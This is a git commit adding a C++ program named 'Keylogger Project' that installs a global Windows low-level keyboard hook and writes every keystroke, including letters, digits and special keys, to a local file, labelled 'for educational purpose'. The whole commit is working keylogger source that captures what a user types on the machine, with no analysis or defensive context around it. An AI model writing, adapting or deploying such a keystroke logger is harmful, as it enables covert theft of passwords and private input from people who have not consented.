6d390a23bff1ce8c4f6c43829046b9bc7fe651cf
Christian De Guzman <ccarlodg@gmail.com>
2025-09-17 02:45:33 -0400

    Keylogger Project

---
+++ Key-Logger/keylogger.cpp
@@ -0,0 +1,72 @@
+#include <iostream>
+#include <fstream>
+#include <Windows.h>
+using namespace std;
+
+void logKeyStroke(int key) {
+    ofstream logFile;
+    logFile.open("keylog.txt", ios::app);
+    if (!logFile) {
+        cerr << "Cannot open log file.\n";
+        return;
+    }
+
+    logFile << "\n ======= FOR EDUCATIONAL PURPOSE ======= \n";
+
+    // If key is BACKSPACE
+    if(key == VK_BACK) {
+        logFile << "[BACKSPACE]";
+    }
+    else if (key == VK_RETURN) {
+        logFile << " ";
+    }
+    else if (key == VK_TAB) {
+        logFile << "[TAB]";
+    }
+    else if (key == VK_SHIFT || key == VK_LSHIFT || key ==VK_RSHIFT ) {
+        logFile << "[SHIFT]";
+    }
+    else if (key == VK_ESCAPE) {
+        logFile << "[ESC]";
+    }
+    else if (key == VK_OEM_PERIOD) {
+        logFile << ".";
+    }
+    // Logging alphabetic keys and numbers as char
+    else if (key >= 'A' && key <= 'Z') {
+        logFile << char(key);
+    }
+    else if (key >= '0' && key <= '9') {
+        logFile << char(key);
+    }
+    // Log other keys using their virtual keycode
+    else {
+        logFile << "[" << key << "]";
+    }
+
+    logFile.close();
+}
+
+LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    if(nCode >= 0 && wParam == WM_KEYDOWN) {
+        KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
+        int key = pKeyBoard->vkCode;
+        logKeyStroke(key);
+    }
+    return CallNextHookEx(NULL, nCode, wParam, lParam);
+}
+
+int main(){
+    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
+
+    MSG msg;
+
+    while (GetMessage(&msg, NULL, 0, 0)) {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+
+    UnhookWindowsHookEx(keyboardHook);
+
+    return 0;
+}
